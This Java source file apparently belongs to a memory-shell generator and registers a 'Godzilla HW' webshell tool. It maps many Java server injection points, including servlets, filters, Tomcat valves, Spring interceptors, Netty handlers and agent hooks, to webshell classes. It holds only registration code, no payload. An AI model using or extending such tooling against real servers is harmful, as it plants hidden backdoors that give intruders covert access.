package com.reajason.javaweb.memshell.shelltool.godzilla.hw;

import com.reajason.javaweb.ShellGenerator;
import com.reajason.javaweb.memshell.ShellTool;
import com.reajason.javaweb.memshell.config.ShellToolConfig;
import com.reajason.javaweb.memshell.server.ToolMapping;
import com.reajason.javaweb.memshell.spi.ShellToolMeta;
import com.reajason.javaweb.memshell.spi.ShellToolProvider;
import org.kohsuke.MetaInfServices;

import static com.reajason.javaweb.memshell.ShellType.*;

/**
 * 哥斯拉 HW 工具：四种 Java 加密器各自的模板按后缀分文件，生成时由
 * {@link GodzillaHwGenerator} 按配置拼接（如 {@code GodzillaHwFilterRaw}）。
 *
 * @author ReaJason
 */
@MetaInfServices(ShellToolProvider.class)
@ShellToolMeta(name = ShellTool.GodzillaHw, order = 11)
public class GodzillaHwShellToolProvider implements ShellToolProvider {

    @Override
    public ToolMapping getToolMapping() {
        return ToolMapping.builder()
                .addShellClass(SERVLET, "com.reajason.javaweb.memshell.shelltool.godzilla.hw.GodzillaHwServlet")
                .addShellClass(JAKARTA_SERVLET, "com.reajason.javaweb.memshell.shelltool.godzilla.hw.GodzillaHwServlet")
                .addShellClass(FILTER, "com.reajason.javaweb.memshell.shelltool.godzilla.hw.GodzillaHwFilter")
                .addShellClass(JAKARTA_FILTER, "com.reajason.javaweb.memshell.shelltool.godzilla.hw.GodzillaHwFilter")
                .addShellClass(LISTENER, "com.reajason.javaweb.memshell.shelltool.godzilla.hw.GodzillaHwListener")
                .addShellClass(JAKARTA_LISTENER, "com.reajason.javaweb.memshell.shelltool.godzilla.hw.GodzillaHwListener")
                .addShellClass(VALVE, "com.reajason.javaweb.memshell.shelltool.godzilla.hw.GodzillaHwValve")
                .addShellClass(JAKARTA_VALVE, "com.reajason.javaweb.memshell.shelltool.godzilla.hw.GodzillaHwValve")
                .addShellClass(PROXY_VALVE, "com.reajason.javaweb.memshell.shelltool.godzilla.hw.GodzillaHwProxy")
                .addShellClass(JAKARTA_PROXY_VALVE, "com.reajason.javaweb.memshell.shelltool.godzilla.hw.GodzillaHwProxy")
                .addShellClass(SPRING_WEBMVC_INTERCEPTOR, "com.reajason.javaweb.memshell.shelltool.godzilla.hw.GodzillaHwInterceptor")
                .addShellClass(SPRING_WEBMVC_JAKARTA_INTERCEPTOR, "com.reajason.javaweb.memshell.shelltool.godzilla.hw.GodzillaHwInterceptor")
                .addShellClass(SPRING_WEBMVC_CONTROLLER_HANDLER, "com.reajason.javaweb.memshell.shelltool.godzilla.hw.GodzillaHwControllerHandler")
                .addShellClass(SPRING_WEBMVC_JAKARTA_CONTROLLER_HANDLER, "com.reajason.javaweb.memshell.shelltool.godzilla.hw.GodzillaHwControllerHandler")
                .addShellClass(ACTION, "com.reajason.javaweb.memshell.shelltool.godzilla.hw.GodzillaHwAction")
                .addShellClass(UNDERTOW_AGENT_SERVLET_HANDLER, "com.reajason.javaweb.memshell.shelltool.godzilla.hw.GodzillaHwUndertowServletHandler")
                .addShellClass(HANDLER, "com.reajason.javaweb.memshell.shelltool.godzilla.hw.GodzillaHwJettyHandler")
                .addShellClass(JAKARTA_HANDLER, "com.reajason.javaweb.memshell.shelltool.godzilla.hw.GodzillaHwJettyHandler")
                .addShellClass(WEBSOCKET, "com.reajason.javaweb.memshell.shelltool.godzilla.hw.GodzillaHwWebSocket")
                .addShellClass(JAKARTA_WEBSOCKET, "com.reajason.javaweb.memshell.shelltool.godzilla.hw.GodzillaHwWebSocket")
                .addShellClass(RAW_WEBSOCKET, "com.reajason.javaweb.memshell.shelltool.godzilla.hw.GodzillaHwRawWebSocket")
                .addShellClass(JAKARTA_RAW_WEBSOCKET, "com.reajason.javaweb.memshell.shelltool.godzilla.hw.GodzillaHwRawWebSocket")
                .addShellClass(NETTY_HANDLER, "com.reajason.javaweb.memshell.shelltool.godzilla.hw.GodzillaHwNettyHandler")
                .addShellClass(AGENT_FILTER_CHAIN, "com.reajason.javaweb.memshell.shelltool.godzilla.hw.GodzillaHwProxy")
                .addShellClass(CATALINA_AGENT_CONTEXT_VALVE, "com.reajason.javaweb.memshell.shelltool.godzilla.hw.GodzillaHwProxy")
                .addShellClass(SPRING_WEBMVC_AGENT_FRAMEWORK_SERVLET, "com.reajason.javaweb.memshell.shelltool.godzilla.hw.GodzillaHwProxy")
                .addShellClass(WEBLOGIC_AGENT_SERVLET_CONTEXT, "com.reajason.javaweb.memshell.shelltool.godzilla.hw.GodzillaHwProxy")
                .addShellClass(WAS_AGENT_FILTER_MANAGER, "com.reajason.javaweb.memshell.shelltool.godzilla.hw.GodzillaHwProxy")
                .build();
    }

    @Override
    public Class<? extends ShellToolConfig> getConfigClass() {
        return GodzillaHwConfig.class;
    }

    @Override
    public Class<? extends ShellGenerator> getGeneratorClass() {
        return GodzillaHwGenerator.class;
    }
}
